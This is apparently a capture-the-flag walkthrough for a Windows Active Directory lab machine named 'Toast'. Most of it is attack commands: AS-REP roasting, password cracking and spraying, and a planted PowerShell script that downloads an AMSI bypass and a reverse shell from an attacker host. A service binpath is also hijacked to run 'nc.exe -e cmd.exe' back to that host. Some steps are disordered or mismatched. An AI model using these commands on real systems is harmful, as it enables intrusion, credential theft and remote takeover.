# Toast

**IP Address:** 172.31.3.8

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3268/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 3269/tcp | open | tcpwrapped |   |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services  |
| 389/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 445/tcp | open | microsoft-ds |   |
| 464/tcp | open | kpasswd5 |   |
| 49666/tcp | open | msrpc | Microsoft Windows RPC  |
| 49667/tcp | open | msrpc | Microsoft Windows RPC  |
| 49674/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 49675/tcp | open | msrpc | Microsoft Windows RPC  |
| 49678/tcp | open | msrpc | Microsoft Windows RPC  |
| 49699/tcp | open | msrpc | Microsoft Windows RPC  |
| 53/tcp | open | domain | Simple DNS Plus  |
| 593/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 5985/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 636/tcp | open | tcpwrapped |   |
| 88/tcp | open | kerberos-sec | Microsoft Windows Kerberos  |
| 9389/tcp | open | mc-nmf | .NET Message Framing  |
| 123/udp | open | ntp | NTP v3 |
| 137/udp | open | netbios-ns | Microsoft Windows netbios-ns  |
| 53/udp | open | domain |   |

## Exploitation
### Exploit Details ()
* **Name** - 
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

1. Enumerate the shares and find the potential username Karen. 

Commands
```
smbmap -H $ip -u guest
```

![Execute Exploit](images/exploit1.png)

2. Add the karen to users.txt and attempt to kerberoast the password. 

Commands
```
GetNPUsers.py toast.csl/ -usersfile users.txt -format john -outputfile hash
```

![Execute Exploit](images/exploit2.png)

3. Crack the password.

Commands
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![Execute Exploit](images/exploit3.png)

4. Connect as karen and enumerate additional users and add them to the users.txt file. 

Commands
```
rpcclient -U karen $ip
MANAGER
enumdomusers
```

![Execute Exploit](images/exploit4.png)

5. Get users & descriptions

Commands
```
/opt/pywerview/pywerview.py get-netuser -w toast.csl -u karen -p MANAGER -t $ip | grep 'samaccountname\|description'
```

![Execute Exploit](images/exploit5.png)

6. Spray password against all found users. 

Commands
```
crackmapexec smb -u users.txt -p W2CUvphqXB -d toast.csl $ip
```

![Execute Exploit](images/exploit6.png)

7. Check shares with new creds

Commands
```
smbmap -u Potato -p W2CUvphqXB -H $ip
```

![Execute Exploit](images/exploit7.png)

8. Create new ClearLogs.ps1 file and upload to share.

Commands
```
echo "IEX(iwr http://10.10.0.37/amsibypass -UseBasicParsing);" > ClearLogs.ps1
echo "IEX(iwr http://10.10.0.37/shell.ps1 -UseBasicParsing);" >> ClearLogs.ps1
smbclient //$ip/potato -U "potato"
W2CUvphqXB
put ClearLogs.ps1
quit
```

9. Catch reverse shell. 

Commands

python3 /opt/PyFuscation/PyFuscation.py -fvp --ps ./shell.ps1
MANAGER
* Shares
IPC$
NETLOGON
Potato
SYSVOL
Users



Commands
```
whoami
cat /var/www/local.txt
```

![Execute Exploit](images/exploit1.png)

## Privilege Escalation
### Exploit Details ()
* **Name** - 
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

1. The service HellEscape contains multiple spaces and no quotes in the path so we can hijack the binary for this service. 

Commands
```

```



sc stop usosvc
sc config UsoSvc binpath="C:\temp\nc.exe -e cmd.exe 10.10.0.37 7777"
sc start usosvc


type C:\Users\Administrator\Desktop\system.txt
C:\Program Files\Purgatory\Up for the challenge\WelcomeToHell.exe
Commands
```bash
whoami
cat /root/proof.txt
```
![Execute Exploit](images/privesc1.png)

## Loot
```
local.txt

proof.txt

```